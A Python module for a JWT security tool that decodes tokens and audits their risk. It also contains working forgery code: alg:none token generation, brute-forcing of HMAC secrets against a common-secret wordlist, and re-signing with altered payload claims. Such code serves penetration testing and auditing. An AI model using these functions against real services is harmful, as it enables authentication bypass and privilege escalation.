"""
JWT inspector, decoder, and forger.
Detects: alg:none, weak secrets, RS256→HS256 confusion.
"""
import base64
import hashlib
import hmac
import json
import logging
import re
import time
from typing import Optional

logger = logging.getLogger(__name__)

COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "your-256-bit-secret", "changeme", "secret_key", "supersecret",
    "mysecret", "test", "flask-secret", "django-insecure", "laravel",
    "1234567890", "qwerty", "abc123", "token", "auth_secret",
    "HS256", "HS384", "HS512", "none", "null", "",
]


def _b64d(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    return base64.b64decode(s + "=" * (-len(s) % 4))


def _b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> dict:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return {"error": "Not a valid JWT (expected 3 parts)"}
    try:
        header  = json.loads(_b64d(parts[0]))
        payload = json.loads(_b64d(parts[1]))
        sig     = parts[2]
        now     = int(time.time())
        exp     = payload.get("exp")
        iat     = payload.get("iat")
        return {
            "header":  header,
            "payload": payload,
            "signature": sig,
            "algorithm": header.get("alg", "unknown"),
            "expired": (exp is not None and exp < now),
            "expires_in": (exp - now) if exp else None,
            "issued_at": iat,
            "raw_parts": parts,
            "kid": header.get("kid"),
            "typ": header.get("typ"),
        }
    except Exception as exc:
        return {"error": f"Decode failed: {exc}"}


def forge_none_alg(token: str) -> Optional[str]:
    """Attempt alg:none attack."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64d(parts[0]))
        header["alg"] = "none"
        new_header = _b64e(json.dumps(header, separators=(",", ":")).encode())
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


def brute_secret(token: str, secrets: list = None) -> dict:
    """Brute-force HMAC secret against common wordlist."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return {"cracked": False, "error": "Invalid JWT"}
    try:
        header = json.loads(_b64d(parts[0]))
        alg = header.get("alg", "HS256")
        if not alg.startswith("HS"):
            return {"cracked": False, "message": f"Cannot brute {alg} (not HMAC)"}
    except Exception:
        return {"cracked": False, "error": "Header decode failed"}

    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_fn = hash_map.get(alg, hashlib.sha256)
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = _b64d(parts[2])

    for secret in (secrets or COMMON_SECRETS):
        try:
            sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
            if hmac.compare_digest(sig, expected_sig):
                return {"cracked": True, "secret": secret, "algorithm": alg}
        except Exception:
            continue

    return {"cracked": False, "algorithm": alg, "tried": len(secrets or COMMON_SECRETS)}


def forge_with_secret(token: str, secret: str, payload_overrides: dict = None) -> Optional[str]:
    """Forge a new JWT with a known secret and optional payload changes."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(_b64d(parts[0]))
        payload = json.loads(_b64d(parts[1]))
        if payload_overrides:
            payload.update(payload_overrides)
        alg = header.get("alg", "HS256")
        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hash_fn = hash_map.get(alg, hashlib.sha256)
        new_header  = _b64e(json.dumps(header,  separators=(",", ":")).encode())
        new_payload = _b64e(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{new_header}.{new_payload}".encode()
        sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        return f"{new_header}.{new_payload}.{_b64e(sig)}"
    except Exception as exc:
        logger.error(f"JWT forge failed: {exc}")
        return None


def analyze_jwt(token: str) -> dict:
    decoded = decode_jwt(token)
    if "error" in decoded:
        return decoded
    issues = []
    alg = decoded.get("algorithm", "")
    if alg.lower() == "none":
        issues.append({"severity": "CRITICAL", "issue": "Algorithm is 'none' — no signature verification"})
    if alg in ("HS256", "HS384", "HS512"):
        brute = brute_secret(token)
        if brute.get("cracked"):
            issues.append({"severity": "CRITICAL", "issue": f"Weak secret cracked: '{brute['secret']}'"})
            decoded["cracked_secret"] = brute["secret"]
    if decoded.get("expired"):
        issues.append({"severity": "INFO", "issue": "Token is expired"})
    if not decoded.get("payload", {}).get("exp"):
        issues.append({"severity": "MEDIUM", "issue": "No expiry (exp) claim — token never expires"})
    none_forged = forge_none_alg(token)
    if none_forged:
        issues.append({"severity": "INFO", "issue": "alg:none forged token generated",
                       "forged_token": none_forged})
    decoded["issues"] = issues
    decoded["risk"] = "CRITICAL" if any(i["severity"] == "CRITICAL" for i in issues) else \
                      "MEDIUM"   if any(i["severity"] == "MEDIUM"   for i in issues) else "LOW"
    return decoded
